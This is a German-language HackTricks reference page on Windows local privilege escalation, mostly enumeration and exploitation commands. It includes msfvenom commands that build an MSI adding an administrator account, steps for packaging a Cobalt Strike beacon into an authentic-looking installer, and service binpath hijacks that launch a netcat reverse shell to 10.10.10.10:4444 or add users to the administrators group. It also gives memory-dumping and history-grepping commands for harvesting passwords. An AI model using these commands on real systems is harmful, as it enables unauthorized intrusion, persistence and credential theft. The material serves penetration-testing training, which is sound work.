# Windows Lokale Privilegieneskalation

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) bei oder der [**Telegram-Gruppe**](https://t.me/peass) oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks-Repository**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud-Repository**](https://github.com/carlospolop/hacktricks-cloud) **einreichen**.

</details>

### **Bestes Tool zur Suche nach Windows-Lokalen Privilegienerhöhungsvectoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initiale Windows-Theorie

### Zugriffstoken

**Wenn Sie nicht wissen, was Windows-Zugriffstoken sind, lesen Sie die folgende Seite, bevor Sie fortfahren:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**Überprüfen Sie die folgende Seite für weitere Informationen zu ACLs - DACLs/SACLs/ACEs:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Integritätsstufen

**Wenn Sie nicht wissen, was Integritätsstufen in Windows sind, sollten Sie die folgende Seite lesen, bevor Sie fortfahren:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows-Sicherheitskontrollen

Es gibt verschiedene Dinge in Windows, die **Sie daran hindern könnten, das System aufzulisten**, ausführbare Dateien auszuführen oder sogar **Ihre Aktivitäten zu erkennen**. Sie sollten die folgende **Seite lesen** und alle diese **Abwehrmechanismen** **aufzählen**, bevor Sie mit der Privilegienerhöhung beginnen:

{% content-ref url="../authentication-credentials-uac-and-efs/" %}
[authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
{% endcontent-ref %}

## Systeminformationen

### Versionsinformationen aufzählen

Überprüfen Sie, ob die Windows-Version über bekannte Sicherheitslücken verfügt (überprüfen Sie auch die angewendeten Patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Versions-Exploits

Diese [Seite](https://msrc.microsoft.com/update-guide/vulnerability) ist nützlich, um detaillierte Informationen über Sicherheitslücken von Microsoft zu suchen. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas hat Watson eingebettet)_

**Lokal mit Systeminformationen**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-Repositories von Exploits:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Irgendwelche Anmeldeinformationen/Saftige Informationen in den Umgebungsvariablen gespeichert?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShell-Verlauf
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transkriptdateien

Sie können lernen, wie Sie dies unter [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) aktivieren.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell-Modulprotokollierung

Details zu PowerShell-Pipeline-Ausführungen werden erfasst, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teile von Skripten. Es besteht jedoch die Möglichkeit, dass nicht alle Ausführungsdetails und Ausgabenergebnisse erfasst werden.

Um dies zu aktivieren, befolgen Sie die Anweisungen im Abschnitt "Transkriptdateien" der Dokumentation und wählen Sie **"Modulprotokollierung"** anstelle von **"PowerShell-Transkription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Um die letzten 15 Ereignisse aus den Powershell-Protokollen anzuzeigen, können Sie Folgendes ausführen:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Skriptblock-Protokollierung**

Eine vollständige Aktivitäts- und Inhaltsaufzeichnung der Skriptausführung wird erfasst, um sicherzustellen, dass jeder Codeblock dokumentiert wird, während er ausgeführt wird. Dieser Prozess bewahrt einen umfassenden Prüfpfad jeder Aktivität, der für forensische Untersuchungen und die Analyse bösartigen Verhaltens wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess bereitgestellt.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Die Ereignisse für den Skriptblock können im Windows-Ereignisprotokoll unter dem Pfad **Anwendungs- und Dienstprotokolle > Microsoft > Windows > PowerShell > Operational** gefunden werden.\
Um die letzten 20 Ereignisse anzuzeigen, können Sie verwenden:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Interneteinstellungen
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Laufwerke
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Sie können das System kompromittieren, wenn die Updates nicht über http**S**, sondern über http angefordert werden.

Beginnen Sie damit zu überprüfen, ob das Netzwerk ein nicht-SSL WSUS-Update verwendet, indem Sie Folgendes ausführen:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Wenn Sie eine Antwort wie folgt erhalten:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` gleich `1` ist.

Dann ist **es ausnutzbar**. Wenn der letzte Registrierungseintrag gleich 0 ist, wird der WSUS-Eintrag ignoriert.

Um diese Schwachstellen auszunutzen, können Sie Tools wie: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) verwenden - Diese sind MiTM weaponized Exploit-Skripte, um 'gefälschte' Updates in den nicht-SSL-WSUS-Verkehr einzuspeisen.

Lesen Sie die Forschung hier:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Lesen Sie hier den vollständigen Bericht**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Grundsätzlich ist dies die Schwachstelle, die dieser Fehler ausnutzt:

> Wenn wir die Möglichkeit haben, unseren lokalen Benutzerproxy zu ändern, und Windows Updates den in den Einstellungen des Internet Explorers konfigurierten Proxy verwendet, haben wir daher die Möglichkeit, [PyWSUS](https://github.com/GoSecure/pywsus) lokal auszuführen, um unseren eigenen Verkehr abzufangen und Code als erhöhter Benutzer auf unserem Gerät auszuführen.
>
> Darüber hinaus verwendet der WSUS-Dienst die Einstellungen des aktuellen Benutzers, er wird also auch seinen Zertifikatsspeicher verwenden. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostname generieren und dieses Zertifikat in den Zertifikatsspeicher des aktuellen Benutzers hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Verkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Trust-on-First-Use-Typ-Validierung des Zertifikats zu implementieren. Wenn das vom Benutzer präsentierte Zertifikat vertrauenswürdig ist und den richtigen Hostnamen hat, wird es vom Dienst akzeptiert.

Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es freigegeben ist).

## KrbRelayUp

Eine **lokale Privilegieneskalation**-Schwachstelle besteht in Windows-**Domänen**-Umgebungen unter bestimmten Bedingungen. Diese Bedingungen umfassen Umgebungen, in denen **LDAP-Signierung nicht durchgesetzt wird**, Benutzer über Selbstrechte verfügen, die es ihnen ermöglichen, **Resource-Based Constrained Delegation (RBCD)** zu konfigurieren, und die Fähigkeit für Benutzer, Computer in der Domäne zu erstellen. Es ist wichtig zu beachten, dass diese **Anforderungen** mit **Standardwerten** erfüllt werden.

Finden Sie den **Exploit unter** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Für weitere Informationen zum Ablauf des Angriffs besuchen Sie [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungen **aktiviert** sind (Wert ist **0x1**), können Benutzer mit beliebigen Berechtigungen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit Payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Wenn Sie eine Meterpreter-Sitzung haben, können Sie diese Technik mithilfe des Moduls **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwenden Sie den Befehl `Write-UserAddMSI` von PowerUP, um im aktuellen Verzeichnis eine Windows MSI-Binärdatei zu erstellen, um Berechtigungen zu eskalieren. Dieses Skript schreibt einen vorab kompilierten MSI-Installer, der zur Hinzufügung eines Benutzers/einer Gruppe auffordert (daher benötigen Sie GIU-Zugriff):
```
Write-UserAddMSI
```
### Ausführung des Binärdatei zur Eskalation von Berechtigungen.

### MSI-Wrapper

Lesen Sie dieses Tutorial, um zu lernen, wie Sie einen MSI-Wrapper mit diesen Tools erstellen. Beachten Sie, dass Sie eine "**.bat**"-Datei einpacken können, wenn Sie nur Befehlszeilen ausführen möchten.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Erstellen von MSI mit WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Erstellen von MSI mit Visual Studio

* Generieren Sie mit Cobalt Strike oder Metasploit ein neues Windows EXE TCP Payload unter `C:\privesc\beacon.exe`.
* Öffnen Sie **Visual Studio**, wählen Sie **Ein neues Projekt erstellen** und geben Sie "Installer" in das Suchfeld ein. Wählen Sie das Projekt **Setup-Assistent** aus und klicken Sie auf **Weiter**.
* Geben Sie dem Projekt einen Namen, z.B. **AlwaysPrivesc**, verwenden Sie **`C:\privesc`** als Speicherort, wählen Sie **Lösung und Projekt im gleichen Verzeichnis platzieren** aus und klicken Sie auf **Erstellen**.
* Klicken Sie immer auf **Weiter**, bis Sie zu Schritt 3 von 4 gelangen (Dateien zum Einbeziehen auswählen). Klicken Sie auf **Hinzufügen** und wählen Sie das gerade generierte Beacon-Payload aus. Klicken Sie dann auf **Fertigstellen**.
* Markieren Sie das Projekt **AlwaysPrivesc** im **Lösung Explorer** und ändern Sie in den **Eigenschaften** **TargetPlatform** von **x86** auf **x64**.
* Es gibt auch andere Eigenschaften, die Sie ändern können, wie z.B. **Autor** und **Hersteller**, die die installierte App authentischer aussehen lassen können.
* Klicken Sie mit der rechten Maustaste auf das Projekt und wählen Sie **Ansicht > Benutzerdefinierte Aktionen**.
* Klicken Sie mit der rechten Maustaste auf **Installieren** und wählen Sie **Benutzerdefinierte Aktion hinzufügen**.
* Doppelklicken Sie auf **Anwendungsordner**, wählen Sie Ihre **beacon.exe**-Datei aus und klicken Sie auf **OK**. Dadurch wird sichergestellt, dass das Beacon-Payload ausgeführt wird, sobald der Installer gestartet wird.
* Ändern Sie unter den **Eigenschaften der benutzerdefinierten Aktion** **Run64Bit** in **True**.
* Schließlich **bauen Sie es**.
* Wenn die Warnung `Datei 'beacon-tcp.exe', die auf 'x64' abzielt, nicht mit der Zielplattform des Projekts 'x86' kompatibel ist` angezeigt wird, stellen Sie sicher, dass Sie die Plattform auf x64 festlegen.

### MSI-Installation

Um die **Installation** der bösartigen `.msi`-Datei im **Hintergrund** auszuführen:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Um diese Schwachstelle auszunutzen, können Sie verwenden: _exploit/windows/local/always\_install\_elevated_

## Antivirus und Detektoren

### Überprüfungseinstellungen

Diese Einstellungen bestimmen, was **protokolliert** wird, daher sollten Sie darauf achten.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding ist interessant zu wissen, wohin die Protokolle gesendet werden.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** ist konzipiert für das **Management von lokalen Administratorpasswörtern**, um sicherzustellen, dass jedes Passwort auf Computern, die einer Domäne beigetreten sind, **eindeutig, zufällig und regelmäßig aktualisiert** wird. Diese Passwörter werden sicher im Active Directory gespeichert und können nur von Benutzern abgerufen werden, denen durch ACLs ausreichende Berechtigungen erteilt wurden, um lokale Administratorpasswörter anzuzeigen, wenn sie autorisiert sind.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Wenn aktiv, werden **Klartextpasswörter im LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA-Schutz

Ab **Windows 8.1** führte Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) ein, um **Versuche von nicht vertrauenswürdigen Prozessen zu blockieren**, auf ihren Speicher zuzugreifen oder Code einzufügen, um das System weiter abzusichern.\
[**Weitere Informationen zum LSA-Schutz hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Anmeldeinformationswächter

**Anmeldeinformationswächter** wurde in **Windows 10** eingeführt. Sein Zweck ist es, die auf einem Gerät gespeicherten Anmeldeinformationen vor Bedrohungen wie Pass-the-Hash-Angriffen zu schützen.| [**Weitere Informationen zum Anmeldeinformationswächter hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Zwischengespeicherte Anmeldeinformationen

**Domänenanmeldeinformationen** werden von der **Lokalen Sicherheitsbehörde** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheitspaket authentifiziert werden, werden in der Regel Domänenanmeldeinformationen für den Benutzer erstellt.\
[**Weitere Informationen zu zwischengespeicherten Anmeldeinformationen hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Sie sollten überprüfen, ob eine der Gruppen, zu denen Sie gehören, interessante Berechtigungen hat.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegierte Gruppen

Wenn Sie **einer privilegierten Gruppe angehören, können Sie möglicherweise Berechtigungen eskalieren**. Erfahren Sie mehr über privilegierte Gruppen und wie Sie sie missbrauchen können, um Berechtigungen zu eskalieren:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Token-Manipulation

Erfahren Sie mehr darüber, was ein **Token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/#access-tokens).\
Überprüfen Sie die folgende Seite, um mehr über interessante Tokens zu erfahren und wie Sie sie missbrauchen können:

{% content-ref url="privilege-escalation-abusing-tokens.md" %}
[privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
{% endcontent-ref %}

### Angemeldete Benutzer / Sitzungen
```bash
qwinsta
klist sessions
```
### Benutzerordner
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Passwortrichtlinie
```bash
net accounts
```
### Holen Sie sich den Inhalt der Zwischenablage
```bash
powershell -command "Get-Clipboard"
```
## Ausführende Prozesse

### Datei- und Ordnerberechtigungen

Zunächst einmal sollten Sie die Prozesse auflisten, um nach Passwörtern in der Befehlszeile des Prozesses zu suchen. Überprüfen Sie, ob Sie eine ausführbare Datei überschreiben können, die gerade ausgeführt wird, oder ob Sie Schreibberechtigungen für den Ordner der ausführbaren Datei haben, um mögliche DLL-Hijacking-Angriffe auszunutzen:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Überprüfen Sie immer, ob möglicherweise [**Electron/CEF/Chromium-Debugger** ausgeführt wird, den Sie missbrauchen könnten, um Berechtigungen zu eskalieren](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Überprüfen der Berechtigungen der Prozessbinärdateien**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Überprüfung der Berechtigungen der Ordner der Prozessbinärdateien ([DLL Hijacking](dll-hijacking/))**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Speicherpasswort-Mining

Sie können einen Speicherdump eines laufenden Prozesses mithilfe von **procdump** von Sysinternals erstellen. Dienste wie FTP haben die **Anmeldeinformationen im Klartext im Speicher**, versuchen Sie, den Speicher zu dumpen und die Anmeldeinformationen zu lesen.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Unsichere GUI-Apps

**Anwendungen, die als SYSTEM ausgeführt werden, können einem Benutzer ermöglichen, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: "Windows-Hilfe und Support" (Windows + F1), Suche nach "Eingabeaufforderung", klicke auf "Klicken Sie hier, um die Eingabeaufforderung zu öffnen"

## Dienste

Erhalten Sie eine Liste der Dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Berechtigungen

Sie können **sc** verwenden, um Informationen zu einem Dienst zu erhalten.
```bash
sc qc <service_name>
```
Es wird empfohlen, das Binärprogramm **accesschk** von _Sysinternals_ zu verwenden, um das erforderliche Berechtigungsniveau für jeden Dienst zu überprüfen.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Es wird empfohlen zu überprüfen, ob "Authentifizierte Benutzer" einen Dienst ändern können:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Hier können Sie accesschk.exe für XP herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn Sie diesen Fehler haben (zum Beispiel mit SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, entweder weil er deaktiviert ist oder weil keine aktivierten Geräte damit verbunden sind._

Sie können es aktivieren, indem Sie:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Beachten Sie, dass der Dienst upnphost von SSDPSRV abhängt, um zu funktionieren (für XP SP1)**

**Ein weiterer Workaround** für dieses Problem besteht darin, auszuführen:
```
sc.exe config usosvc start= auto
```
### **Ändern des Dienst-Binärpfads**

In dem Szenario, in dem die Gruppe "Authentifizierte Benutzer" **SERVICE\_ALL\_ACCESS** für einen Dienst besitzt, ist eine Änderung des ausführbaren Binärpfads des Dienstes möglich. Um **sc** zu ändern und auszuführen:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Dienst neu starten
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegien können durch verschiedene Berechtigungen eskaliert werden:

* **SERVICE\_CHANGE\_CONFIG**: Ermöglicht die Neukonfiguration des Dienstbinärs.
* **WRITE\_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen, was zur Fähigkeit führt, Dienstkonfigurationen zu ändern.
* **WRITE\_OWNER**: Ermöglicht den Besitzerwechsel und die Neukonfiguration von Berechtigungen.
* **GENERIC\_WRITE**: Vererbt die Fähigkeit, Dienstkonfigurationen zu ändern.
* **GENERIC\_ALL**: Vererbt ebenfalls die Fähigkeit, Dienstkonfigurationen zu ändern.

Für die Erkennung und Ausnutzung dieser Schwachstelle kann das _exploit/windows/local/service\_permissions_ genutzt werden.

### Schwache Berechtigungen für Dienstbinärdateien

**Überprüfen Sie, ob Sie die Binärdatei, die von einem Dienst ausgeführt wird, ändern können** oder ob Sie **Schreibberechtigungen im Ordner** haben, in dem sich die Binärdatei befindet ([**DLL Hijacking**](dll-hijacking/))**.**\
Sie können jede Binärdatei, die von einem Dienst ausgeführt wird, mit **wmic** (nicht in system32) abrufen und Ihre Berechtigungen mit **icacls** überprüfen:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Du kannst auch **sc** und **icacls** verwenden:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dienst-Registrierungsberechtigungen ändern

Sie sollten überprüfen, ob Sie eine Dienstregistrierung ändern können.\
Sie können Ihre Berechtigungen für eine Dienstregistrierung überprüfen, indem Sie Folgendes tun:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Es sollte überprüft werden, ob **Authentifizierte Benutzer** oder **NT AUTHORITY\INTERACTIVE** über `FullControl`-Berechtigungen verfügen. Wenn dies der Fall ist, kann die vom Dienst ausgeführte Binärdatei geändert werden.

Um den Pfad der ausgeführten Binärdatei zu ändern:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Dienst-Registrierungsberechtigungen für AppendData/AddSubdirectory

Wenn Sie diese Berechtigung über eine Registrierung haben, bedeutet dies, dass **Sie Unterregistrierungen von dieser erstellen können**. Im Falle von Windows-Diensten reicht dies aus, um **beliebigen Code auszuführen:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Nicht in Anführungszeichen gesetzte Dienstpfade

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, wird Windows versuchen, jedes Ende vor einem Leerzeichen auszuführen.

Zum Beispiel wird für den Pfad _C:\Program Files\Some Folder\Service.exe_ Windows versuchen, auszuführen:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste alle nicht in Anführungszeichen stehenden Dienstpfade auf, die nicht zu den integrierten Windows-Diensten gehören:
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
